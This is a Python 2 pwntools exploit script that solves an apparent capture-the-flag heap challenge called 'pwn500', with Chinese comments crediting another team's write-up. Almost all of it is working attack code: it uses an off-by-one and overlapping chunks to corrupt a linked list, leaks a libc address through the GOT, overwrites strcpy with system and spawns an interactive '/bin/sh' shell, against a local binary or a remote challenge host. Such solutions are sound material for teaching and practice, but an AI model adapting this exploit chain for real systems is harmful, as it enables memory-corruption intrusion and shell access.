#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
 
###Null战队的wp，读懂了，这题对于我来说，还是有些复杂
###主要在于重新构造了链表结构，利用overlapping chunk，最后修改链表使其指向了got表，
###从而打印出了地址
###利用system地址覆盖了strcpy的地址，从而实现了执行system函数。
###666，这道题。
 
# switches
DEBUG = 1
LOCAL = 1
VERBOSE = 1
 
# modify this
if LOCAL:
    io = process('./pwn500')
else:
    io = remote('119.28.62.216',10024)
 
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
 
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)
 
def rn(count):
    return io.recvn(count)
 
def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf
 
def sl(data):
    return io.sendline(data)
 
def sn(data):
    return io.send(data)
 
def info(string):
    return log.info(string)
 
def dehex(s):
    return s.replace(' ','').decode('hex')
 
def limu8(x):
    return c_uint8(x).value
 
def limu16(x):
    return c_uint16(x).value
 
def limu32(x):
    return c_uint32(x).value
 
# define interactive functions here
def enterGame(char='y'):
    ru('n)?\n')
    sl(char)
    return
 
def menu():
    return ru(':')
 
def senderinfo(name,contact):
    menu()
    sl('1')
    ru('?')
    sn(name)
    ru('?')
    sn(contact)
    return
 
def submitpack():
    menu()
    sl('6')
    return
 
def showrcvr():
    menu()
    sl('5')
    return
 
def deletercvr(index):
    menu()
    sl('4')
    ru('?')
    sl(str(index))
    return
 
def newrcvr():
    menu()
    sl('2')
    return
 
def setReceiver(name,postcode,contact,address):
    menu()
    sl('1')
    ru('?')
    sn(name)
    ru('?')
    sn(postcode)
    ru('?')
    sn(contact)
    ru('?')
    sn(address)
    return
 
def newPackage(length, data):
    menu()
    sl('2')
    ru('?')
    sl(str(length))
    ru('~')
    sn(data)
    return
 
def savePackage():
    menu()
    sl('5')
    return
 
def exitAddRecv():
    menu()
    sl('6')
    return
 
def deletePackage(index):
    menu()
    sl('3')
    ru('?')
    sl(str(index))
    return
 
def editrcvr(index,name,postcode,contact,address):
    menu()
    sl('3')
    ru('?')
    sl(str(index))
    ru('?')
    sn(name)
    ru('?')
    sn(postcode)
    ru('?')
    sn(contact)
    ru('?')
    sn(address)
    return
 
# define exploit function here
def pwn():
    if DEBUG: gdb.attach(io,"b *0x400C00")
    enterGame()
 
    senderinfo('1\n', '1\n')
    newrcvr()
    setReceiver('1\n', '1\n', '1\n', '1\n')
    newPackage(160, 'a'.ljust(159,'a')+'\n')
    newPackage(160, 'b'.ljust(159,'b')+'\n')
    newPackage(160, 'c'.ljust(159,'c')+'\n')
    newPackage(8, 'pad\n')  # sep
    newPackage(160, 'd'.ljust(159,'d')+'\n')
    newPackage(224, 'e'.ljust(223,'e')+'\n')
    #newPackage(160, 'f\n')
    deletePackage(2)
    deletePackage(1)
    savePackage()
 
    newrcvr()
    setReceiver('2\n', '2\n', '2\n', '2\n')     # take original 2
    newPackage(160, 'x'*152 + p64(816))    # take 1, off by one
    deletePackage(3)            # delete 3
    deletePackage(3)            # wild chunk overlap
    savePackage()
 
    newrcvr()
    exitAddRecv()
 
    newrcvr()
    setReceiver('3\n', '3\n', '3\n', '3\n')
    newPackage(0x1f0, 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAA' + p64(0x602ff0) + p64(0x0) + '\n')
    exitAddRecv()
 
    editrcvr(0, '1\n', '1\n', '1\n', '/bin/sh;\n')
    showrcvr()
    for i in xrange(2):    ru('address:')
    addr = u64(rn(6).ljust(8,'\x00')) - 0xd95b0
    info("Libc leak = " + hex(addr))
    system = addr + 0x414f0
    print hex(system)
    read = addr + 0xd95b0
    editrcvr(1, '1\n', '1\n', p64(system)[:-1] + '\n', p64(read)[:-1] + '\n')
    
    editrcvr(0, 'x\n', 'x\n', 'x\n', 'x\n')
 
    io.interactive()
    return
if __name__ == '__main__':
    pwn()
